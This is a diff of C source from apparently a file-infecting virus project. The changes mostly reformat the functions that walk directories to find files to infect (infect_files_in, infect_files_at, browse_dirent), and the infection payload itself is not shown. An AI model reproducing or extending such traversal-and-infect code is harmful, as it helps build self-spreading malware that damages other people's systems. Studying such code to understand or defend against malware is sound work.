@@ -1,14 +1,13 @@
-
 #include <limits.h>
-#include "syscall.h"
 #include "virus.h"
+#include "syscalls.h"
 #include "utils.h"
 
-static void	infect_files_at(const struct virus_header *vhdr, \
+static void	infect_files_at(const struct virus_header *vhdr,
 			char path[PATH_MAX], char *path_end);
 
-static void	browse_dirent(const struct virus_header *vhdr,   \
-			char path[PATH_MAX], char *path_end,     \
+static void	browse_dirent(const struct virus_header *vhdr,
+			char path[PATH_MAX], char *path_end,
 			const char buff[1024], int nread)
 {
 	for (int bpos = 0; bpos < nread;)
@@ -27,12 +26,12 @@ static void	browse_dirent(const struct virus_header *vhdr,   \
 	}
 }
 
-static void	infect_files_at(const struct virus_header *vhdr, \
+static void	infect_files_at(const struct virus_header *vhdr,
 			char path[PATH_MAX], char *path_end)
 {
-	char		buff[1024];
-	int		fd = sys_open(path, O_RDONLY);
-	int		nread;
+	char	buff[1024];
+	int	fd = sys_open(path, O_RDONLY);
+	int	nread;
 
 	if (fd < 0) return ;
 
@@ -42,7 +41,8 @@ static void	infect_files_at(const struct virus_header *vhdr, \
 	sys_close(fd);
 }
 
-inline void	infect_files_in(const struct virus_header *vhdr, const char *root_dir)
+inline void	infect_files_in(const struct virus_header *vhdr,
+			const char *root_dir)
 {
 	char	path[PATH_MAX];
 
